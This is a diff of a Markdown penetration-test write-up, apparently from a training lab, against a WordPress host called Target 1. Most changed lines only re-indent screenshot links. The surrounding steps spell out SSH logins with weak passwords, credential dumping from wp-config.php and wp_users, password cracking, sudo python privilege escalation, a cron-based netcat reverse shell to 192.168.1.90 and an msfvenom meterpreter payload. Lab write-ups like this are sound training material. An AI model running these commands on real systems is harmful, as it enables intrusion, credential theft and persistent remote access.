@@ -61,13 +61,13 @@ Scans
 - Metasploit scans:
   - Auxiliary/scanner/http/wordpress_xmlrpc_login
 
-  ![xmlrpc_login](P3_Images/P3T1_aux_scanner_wordpress_xmlrpc_login.png)
+    ![xmlrpc_login](P3_Images/P3T1_aux_scanner_wordpress_xmlrpc_login.png)
   - Auxiliary/dos/http/wordpress_xmlrpc_dos
 
-  ![xmlrpc_dos](P3_Images/P3T1_aux_dos_http_wordpress_xmlrpc_dos.png)
+    ![xmlrpc_dos](P3_Images/P3T1_aux_dos_http_wordpress_xmlrpc_dos.png)
   - Negative results: target not vulnerable to GHOST: Auxiliary/scanner/http/wordpress_ghost_scanner
 
-  ![GHOST](P3_Images/P3T1_ghost_scan.png)
+    ![GHOST](P3_Images/P3T1_ghost_scan.png)
 
 
 ## Exploitation
@@ -109,9 +109,9 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - `set VERBOSE true`
     - `exploit`
 
-    ![michael_options](P3_Images/P3T1_msfconsole_options_michael.png)
+      ![michael_options](P3_Images/P3T1_msfconsole_options_michael.png)
 
-    ![michael_password](P3_Images/P3T1_find_michael_password.png)
+      ![michael_password](P3_Images/P3T1_find_michael_password.png)
     
     - User michael password is michael.  This exploit did not find the password for steven.
 
@@ -120,7 +120,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - `ssh michael@192.168.1.110 -p 22` 
     - #password: `Michael`
 
-    ![michael_ssh](P3_Images/P3T1_michael_ssh.png)
+      ![michael_ssh](P3_Images/P3T1_michael_ssh.png)
   
   
   - I searched the system for the designated data and for additional information that would help maintain access to the system. 
@@ -131,7 +131,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
         - `ls`
         - `cat flag2.txt`
 
-        ![flag2](P3_Images/P3T1_flag2_1st_time.png)
+       ![flag2](P3_Images/P3T1_flag2_1st_time.png)
 
       - For **flag1:**
         - `cd /var/www/html`
@@ -145,7 +145,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `cd /var/www/html/wordpress`
       - `cat wp-config.php`
 
-      ![wp-config_php](P3_Images/P3T1_wp-config.png)
+        ![wp-config_php](P3_Images/P3T1_wp-config.png)
 
       #MySQL DB user name = root
 
@@ -157,11 +157,11 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `use wordpress;`
       - `show tables;`
 
-      ![database_tables](P3_Images/P3T1_mysql_database_wordpress_tables.png)
+        ![database_tables](P3_Images/P3T1_mysql_database_wordpress_tables.png)
 
       - `describe wp_users;`
     
-      ![wp_users](P3_Images/P3T1_wp_users_fields.png)
+        ![wp_users](P3_Images/P3T1_wp_users_fields.png)
 
       - `select user_login, user_pass from wp_users;`
 
@@ -178,7 +178,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
         - `cd /`
         - `ls`
 
-        ![altflag4](P3_Images/P3T1_full_flag4.png)
+          ![altflag4](P3_Images/P3T1_full_flag4.png)
 
   - In order to extend access, used John to crack the hashed passwords:
 
@@ -197,9 +197,9 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - In addition, a Cronjob was added to attempt to automatically start the reverse shell periodically.
       - `crontab -e`
       - `30 7 * * * nc 192.168.1.90 4444 -e /bin/bash`
-    `nc 192.168.1.90 4444 -e /bin/bash`
+      - `nc 192.168.1.90 4444 -e /bin/bash`
 
-      ![crontab](P3_Images/P3T1_reverse_shell_michael.png)
+        ![crontab](P3_Images/P3T1_reverse_shell_michael.png)
     
     - on kali attacker machine run:
       - `nc -lnvp 4444`
@@ -208,7 +208,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
         - `whoami`
         - `pwd`
 
-      ![listener](P3_Images/P3T1_nc_lvnp_4444_michael.png)
+        ![listener](P3_Images/P3T1_nc_lvnp_4444_michael.png)
 
   - Since an attacker has a higher chance of maintaining access if they have multiple compromised points, I moved on to user steven.
 
@@ -221,7 +221,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `sudo -l`
       - Saw that steven had sudo access through python.
 
-      ![sudo_l](P3_Images/P3T1_steven_sudo-l.png)
+        ![sudo_l](P3_Images/P3T1_steven_sudo-l.png)
 
     - To escalate privileges:
       - `sudo python -c ‘import pty;pty.spawn(“bin/bash”)’`
@@ -231,7 +231,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `sudo python -c ‘import os; os.system(“bash”)’`
       - Gain sudo/root
 
-      ![python_privilege](P3_Images/P3T1_steven_python_gain_root_command.png)
+        ![python_privilege](P3_Images/P3T1_steven_python_gain_root_command.png)
 
     - Used Metasploit to gain persistence for user steven:
       - `msfconsole`
@@ -242,18 +242,18 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
       - `set PASSWORD pink84`
       - `exploit`
 
-      ![steven_sshexec](P3_Images/P3T1_steven_sshexec.png)
+        ![steven_sshexec](P3_Images/P3T1_steven_sshexec.png)
 
     - Crafted payload with msfvenom:
       - `msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw -o /tmp/pythonwhoo.py`
       
-      ![pythonwhoo](P3_Images/P3T1_msfvenom_steven.png)
+        ![pythonwhoo](P3_Images/P3T1_msfvenom_steven.png)
     - The upload command did not work inside the Meterpreter session already in existence, so using nano, I cut and pasted the contents of the payload into a new file created on Target 1.  
 
     - In the existing Meterpreter session, executed the payload:
       - `execute -f pythonwhoo.py`
 
-      ![Deploy_custom_package](P3_Images/P3T1_execute_pythonwhoo.png)
+        ![Deploy_custom_package](P3_Images/P3T1_execute_pythonwhoo.png)
 
     - In another session, I started the exploit:
       - `exploit python/meterpreter/reverse_tcp`
@@ -262,7 +262,7 @@ The Red Team was able to penetrate Target 1 and retrieve the requested confident
     - This gained the reverse TCP handler connection, and I was able to confirm the connection:
       - `pwd`
    
-       ![reverse_tcp](P3_Images/P3T1_reverse_tcp_steven.png)
+        ![reverse_tcp](P3_Images/P3T1_reverse_tcp_steven.png)
 
 
 ## References:
